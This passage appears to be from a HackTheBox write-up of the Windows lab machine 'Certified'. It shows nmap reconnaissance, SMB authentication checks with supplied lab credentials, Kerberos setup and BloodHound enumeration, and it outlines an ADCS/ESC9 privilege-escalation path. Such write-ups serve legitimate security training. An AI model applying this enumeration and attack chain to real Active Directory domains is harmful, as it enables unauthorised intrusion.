---
render_with_liquid: false
title: HackTheBox Writeup  Certified
date: 2025-02-19 17:01:25 +1400
tags: [hackthebox, nmap, windows, ad, assumed-breach, netexec, bloodhound-python, bloodhound, ldeep, adcs, dacl-abuse, impacket, shadow-credentials, pywhisker, certipy, pass-the-ticket, evil-winrm, adcs-esc9, dcsync]
---



`Certified` is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the `management_svc` account, ACLs (Access Control Lists) over privileged objects are enumerated leading us to discover that `judith.mader` which has the `write owner` ACL over `management` group, management group has `GenericWrite` over the `management_svc` account where we can finally authenticate to the target using `WinRM` obtaining the user flag. Exploitation of the Active Directory Certificate Service (ADCS) is required to get access to the `Administrator` account by abusing shadow credentials and `ESC9`.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt init '10.10.11.41 certified.htb DC01.certified.htb DC01'
+-----------+--------+-------------+--------------------+
|  PROFILE  | STATUS |     IP      |       DOMAIN       |
+-----------+--------+-------------+--------------------+
| certified | on     | 10.10.11.41 | certified.htb      |
| certified | on     | 10.10.11.41 | DC01.certified.htb |
| certified | on     | 10.10.11.41 | DC01               |
+-----------+--------+-------------+--------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Feb 19 17:01:25 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49681,49713,49736,49771, 10.10.11.41
Nmap scan report for 10.10.11.41
Host is up, received user-set (0.080s latency).
Scanned at 2025-02-19 17:01:25 CST for 108s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-19 15:44:23Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
| SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZa
| Fw0yNTA1MTMxNTQ5MzZaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMx/FhgH36heOUjpNhO4JWYX
| E0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvgFLZ7yuZf3ubIcEv8
| wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmoX3i
| Ky0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l6
| 52hfOhdz5YOU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2E
| e+28xaBIGAgNn5TMcS+oJC0qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0C
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYE
| FPTg6Uo2pYQv7jJTC9x7Reo9CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
| AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIw
| TgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0
| Njc3OC0yNjc1OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOC
| AQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDkyiu7uCaTOehQ4rITZE1xefpHW
| VVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJHsk+gby/JShv
| ztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuE
| aOEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQU
| fgVn+2b7pjWIPAWdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtI
| zQY41iYatWCKZW54Ylno2wj9tg==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-02-19T15:46:03+00:00; +6h42m51s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-19T15:46:04+00:00; +6h42m51s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
| SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZa
| Fw0yNTA1MTMxNTQ5MzZaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMx/FhgH36heOUjpNhO4JWYX
| E0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvgFLZ7yuZf3ubIcEv8
| wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmoX3i
| Ky0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l6
| 52hfOhdz5YOU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2E
| e+28xaBIGAgNn5TMcS+oJC0qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0C
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYE
| FPTg6Uo2pYQv7jJTC9x7Reo9CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
| AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIw
| TgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0
| Njc3OC0yNjc1OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOC
| AQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDkyiu7uCaTOehQ4rITZE1xefpHW
| VVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJHsk+gby/JShv
| ztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuE
| aOEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQU
| fgVn+2b7pjWIPAWdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtI
| zQY41iYatWCKZW54Ylno2wj9tg==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-19T15:46:03+00:00; +6h42m51s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
| SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZa
| Fw0yNTA1MTMxNTQ5MzZaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMx/FhgH36heOUjpNhO4JWYX
| E0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvgFLZ7yuZf3ubIcEv8
| wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmoX3i
| Ky0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l6
| 52hfOhdz5YOU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2E
| e+28xaBIGAgNn5TMcS+oJC0qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0C
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYE
| FPTg6Uo2pYQv7jJTC9x7Reo9CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
| AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIw
| TgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0
| Njc3OC0yNjc1OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOC
| AQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDkyiu7uCaTOehQ4rITZE1xefpHW
| VVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJHsk+gby/JShv
| ztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuE
| aOEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQU
| fgVn+2b7pjWIPAWdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtI
| zQY41iYatWCKZW54Ylno2wj9tg==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-19T15:46:04+00:00; +6h42m51s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
| SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZa
| Fw0yNTA1MTMxNTQ5MzZaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMx/FhgH36heOUjpNhO4JWYX
| E0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvgFLZ7yuZf3ubIcEv8
| wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmoX3i
| Ky0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l6
| 52hfOhdz5YOU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2E
| e+28xaBIGAgNn5TMcS+oJC0qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0C
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYE
| FPTg6Uo2pYQv7jJTC9x7Reo9CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
| AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIw
| TgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0
| Njc3OC0yNjc1OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOC
| AQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDkyiu7uCaTOehQ4rITZE1xefpHW
| VVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJHsk+gby/JShv
| ztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuE
| aOEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQU
| fgVn+2b7pjWIPAWdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtI
| zQY41iYatWCKZW54Ylno2wj9tg==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49736/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49771/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h42m50s, deviation: 0s, median: 6h42m50s
| smb2-time: 
|   date: 2025-02-19T15:45:23
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50458/tcp): CLEAN (Timeout)
|   Check 2 (port 11093/tcp): CLEAN (Timeout)
|   Check 3 (port 12583/udp): CLEAN (Timeout)
|   Check 4 (port 65012/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Feb 19 17:03:13 2025 -- 1 IP address (1 host up) scanned in 107.56 seconds
```


## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ nxc smb $(pt get rhost) -u '' -p ''
nxc smb $(pt get rhost) -u 'a' -p ''
nxc smb $(pt get rhost) -u 'Guest' -p ''
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\:
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [-] certified.htb\a: STATUS_LOGON_FAILURE
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [-] certified.htb\Guest: STATUS_ACCOUNT_DISABLED
```


### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ nxc smb $(pt get rhost) -u '' -p '' --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\:
SMB         10.10.11.41     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```


# User Flag
---

## Auth as judith.mader


### Assumed breach scanario

- A simulation of assumed breach scenario gave us the credential : `judith.mader:judith09`

![](/assets/obsidian/2f4e53d8aa785d7156796112d9f3719d.png)

Set the credentials in variables (Using custom pentest framework, it is not required to reproduce the steps below)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt set user 'judith.mader'; pt set pass 'judith09'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
judith.mader:judith09
```

Validate that authentication on CIFS service is successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ nxc smb -k $(pt get dc_fqdn) -u "$(pt get user)" -p "$(pt get pass)"
SMB         DC01.certified.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         DC01.certified.htb 445    DC01             [+] certified.htb\judith.mader:judith09
```


## Shell as management_svc


### Setup active directory environment

Sync time with domain controller

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ sudo ~/scripts/ad/sync_ntp.sh $(pt get ip)
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-02-19 23:49:26.196459 (+0800) +24170.915192 +/- 0.039600 10.10.11.41 s1 no-leap
CLOCK: time stepped by 24170.915192

Done syncing time with NTP server: 10.10.11.41
```

Set `domain controller name` and `domain controller FQDN` in variables

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt set dc_name "$(cat .pt/hosts | head -n1 | awk '{print $NF}')"; pt set dc_fqdn "$(pt get dc_name).$(pt get domain)"

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt get dc_fqdn; pt get dc_name
DC01.certified.htb
DC01
```

Configure **kerberos**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ sudo ~/scripts/ad/configure_krb5.py $(pt get domain) $(pt get dc_name)
[*] Configuration Data:
[libdefault]
        default_realm = CERTIFIED.HTB

[realms]
        CERTIFIED.HTB = {
                kdc = dc01.certified.htb
                admin_server = dc01.certified.htb
        }

[domain_realm]
        certified.htb = CERTIFIED.HTB
        .certified.htb = CERTIFIED.HTB

[*] Previous config backed up to /etc/krb5.conf~
[+] /etc/krb5.conf has been configured
```

### Domain Enumeration


#### Bloodhound

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ bloodhound-python -d $(pt get domain) -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 18S
INFO: Compressing output into 20250219235148_bloodhound.zip
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ sudo neo4j restart
Neo4j is not running.
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:885367). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

![](/assets/obsidian/50bd3ef49af2b6ac1b47246f5cba3b87.png)


#### Ldeep

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
